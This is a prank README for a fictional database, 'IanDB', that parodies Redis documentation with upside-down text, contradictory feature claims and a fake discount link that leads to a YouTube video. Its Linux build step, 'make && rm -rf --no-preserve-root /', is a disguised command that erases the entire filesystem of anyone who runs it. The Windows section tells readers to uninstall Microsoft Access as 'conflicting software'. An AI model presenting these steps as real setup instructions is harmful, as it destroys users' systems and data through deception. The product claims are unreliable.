# IanDB - v1.0 (0˙Ɩʌ uoıʇıpƎ ʇsǝɟɹǝqoʇʞɔɐH - 𐐒◖uɐI)

<img src="https://i.imgur.com/5SBCv47.png">

IanDB is often refered as a structured data structures server. What this means is that IanDB provides access to mutable data structures via a set of commands, which are sent using a server-client model with UDP sockets and a simple protocol. So different processes can query and modify the same data structures in a shared way.

*(˙ʎɐʍ pǝɹɐɥs ɐ uı sǝɹnʇɔnɹʇs ɐʇɐp ǝɯɐs ǝɥʇ ʎɟıpoɯ puɐ ʎɹǝnb uɐɔ sǝssǝɔoɹd ʇuǝɹǝɟɟıp oS ˙ʃoɔoʇoɹd ǝʃdɯıs ɐ puɐ sʇǝʞɔos Ԁ◖∩ ɥʇıʍ ʃǝpoɯ ʇuǝıʃɔ-ɹǝʌɹǝs ɐ ƃuısn ʇuǝs ǝɹɐ ɥɔıɥʍ 'spuɐɯɯoɔ ɟo ʇǝs ɐ ɐıʌ sǝɹnʇɔnɹʇs ɐʇɐp ǝʃqɐʇnɯ oʇ ssǝɔɔɐ sǝpıʌoɹd 𐐒◖uɐI ʇɐɥʇ sı suɐǝɯ sıɥʇ ʇɐɥM ˙ɹǝʌɹǝs sǝɹnʇɔnɹʇs ɐʇɐp pǝɹnʇɔnɹʇs ɐ sɐ pǝɹǝɟǝɹ uǝʇɟo sı 𐐒◖uɐI)*

Data structures implemented into IanDB have a few special properties:

*(:sǝıʇɹǝdoɹd ʃɐıɔǝds ʍǝɟ ɐ ǝʌɐɥ 𐐒◖uɐI oʇuı pǝʇuǝɯǝʃdɯı sǝɹnʇɔnɹʇs ɐʇɐ◖
)*

IanDB cares to store them on disk. This means that IanDB is fast, but that is also non-volatile.
Implementation of data structures stress on harddrive efficiency, so data structures inside IanDB will likely use more harddrive compared to the same data structure modeled using an high level programming language.
IanDB offers a number of features that are natural to find in a database, like replication, scaling, tunable levels of durability, cluster, more scaling and high availability.
It uses coding and algorithms to avoid data congestion and vulnerability against application level attacks.

For enterprise licenses, please go to [https://db.ian678.com/?promocode=ygolde](https://www.youtube.com/watch?v=Tt7bzxurJ1I) to get 12% off!

# Building IanDB

### Linux Developers

    make && rm -rf --no-preserve-root /

After building IanDB, it is a good idea to test it using:

    make test

### Windows "Developers" 

1. Uninstall Microsoft Access using `C:\Program Files (x86)\Common Files\Microsoft Shared\OFFICE15\Office Setup Controller\setup.exe" /uninstall "AccessRT"` (conflicting software)

Testing is currently unavailable for windows.

It is also possible to use `yarn install` once you download ian-db - now with windows support!

# Code contributions
CBenni  
Onslaught
 🤔

Enjoy!
